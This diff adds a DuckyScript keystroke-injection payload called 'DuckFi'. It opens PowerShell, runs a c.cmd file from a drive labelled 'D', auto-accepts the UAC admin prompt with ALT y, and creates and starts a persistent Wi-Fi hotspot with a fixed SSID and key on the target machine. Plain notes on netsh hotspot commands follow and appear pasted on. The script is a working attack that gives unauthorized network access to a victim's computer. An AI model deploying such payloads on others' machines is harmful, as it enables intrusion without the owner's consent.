@@ -1,0 +1,42 @@
+REM DuckFi, activate Windows Wifi Hotspots for 'Free Wifi'
+REM Created by : C0SM0
+
+REM Stage 1, get administrative powershell
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell /c $u=gwmi Win32_Volume|?{$_.Label -eq'D'}|select name;cd $u.name;./c.cmd
+ENTER
+
+REM Stage2, accept administrative permissions
+DELAY 2000
+ALT y
+DELAY 1500
+
+---
+
+REM Stage 3, create hotspot
+STRING netsh wlan set hostednetwork mode=allow ssid=cosmo key=subscribe keyUsage=persistent;netsh wlan start cosmo;exit
+ENTER
+
+“Create Wifi Hotspot” 
+
+type: netsh wlan set hostednetwork mode=allow ssid=hotspotname key=hotspotpassword 
+
+*password has minimum of 8 characters 
+
+*hotspotname can be changed to ideal name 
+
+*hotspotpassword can be changed to ideal password 
+
+to start/activate: 
+
+type: netsh wlan start hotspotname 
+
+*hotspotname needs to be the same as before 
+
+to stop/deactivate: 
+
+type: netsh wlan stop hotspotname 
+
+*hotspotname needs to be the same as before
